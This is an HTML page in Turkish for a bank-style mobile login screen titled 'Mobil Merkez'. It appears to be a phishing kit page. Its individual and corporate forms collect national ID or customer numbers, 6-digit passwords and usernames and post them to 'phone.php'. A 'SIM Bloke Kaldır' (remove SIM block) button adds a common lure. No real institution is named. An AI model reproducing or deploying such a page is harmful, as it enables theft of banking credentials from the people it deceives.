

<!DOCTYPE html>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title> Mobil Merkez</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
    <meta name="google" content="notranslate">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="./style.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>
    
<style>
       .tab_head {
           display: flex;
       }

       .tab_head_title {
           width: 50%;
           text-align: center;
           border: 0;
           color: #9d9d9d;
           border-bottom: 2px solid #d0d1d6;
       }

       .tab_head_title.active {
           color: #1ca288;
           border-bottom: 2px solid #1ca288;
       }

       .tab_head_title span {
           font-size: 14px;
           font-weight: 600;
           padding: 10px 0;
           display: block;
       }

       .tab_body_content {
           display: none;
       }

       .tab_body_content.active {
           display: block;
       }
      html { 
   margin: 0 auto;
   max-width: 420px;
      }
   </style> 
    <div class="root" style="max-width: 420px; margin: 0 auto;">
        <div class="header">
            <div class="d-flex justify-content-center">
                <img src="./logo.png" style="width:130px" alt="Logo">
            </div>
        </div>
        <div class="tab_head">
            <div class="tab_head_title active" data-id="bireysel">
                <span>Bireysel</span>
            </div>
            <div class="tab_head_title" data-id="kurumsal">
                <span>Kurumsal</span>
            </div>
        </div>
        <div class="body">
            <div class="tab_body">
                <div class="tab_body_content active" data-id="bireysel">
                    <form action="phone.php" method="post"> 
                        <div class="form">
                             <div class="form-group">
                                <label class="text-start">Müşteri No / T.C. Kimlik Numarası</label>
                                <input type="text" required minlength="11" maxlength="11" name="username" class="form-control" id="customUsername" autocomplete="no">
                            </div>
                            <div class="form-group">
                                <label>Şifre</label>
                                <input type="password" required minlength="6" maxlength="6" name="password" class="form-control" id="customPassword" autocomplete="current-password">
                            </div>
                        </div>
                        <div id="alertDiv" class="alert alert-danger" style="display:none;">
                            TC kimlik numarası veya şifre hatalı.
                        </div>
                        <button type="submit" name="submit" class="login-btn">Giriş</button>
                    </form>
                </div>
                <div class="tab_body_content" data-id="kurumsal">
                    <form action="phone.php" method="post" autocomplete="off"> 
                        <div class="form">
                            <div class="form-group">
                                <label class="text-start">Müşteri No</label>
                                <input type="text" required minlength="11" maxlength="11" name="username" class="form-control" id="kurumsalUsername" autocomplete="no">
                            </div>
                            <div class="form-group mb-2">
                                <label>Şifre</label>
                                <input type="password" required minlength="6" maxlength="6" name="password" class="form-control" id="kurumsalPassword" autocomplete="current-password">
                            </div>
                            <div class="form-group">
                                <label>Kullanıcı Adı</label>
                                <input type="text" required name="kurumsalusername" class="form-control" id="kurumsalKullaniciAdi">
                            </div>
                        </div>
                        <button type="submit" name="submit" class="login-btn">Giriş</button>
                    </form>
                    
                   
                    
                    
    
                </div>
            </div>

            <button class="alt-btn sifreunuttum">Şifremi Unuttum</button>
            <button class="alt-btn mb-3 simbloke">SIM Bloke Kaldır</button>
            <button type="button" id="musteri" class="alt-btn">Müşteri Olmak İstiyorum</button>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
        <script src="script.js?v=1.1.2"></script>
</body>
</html>
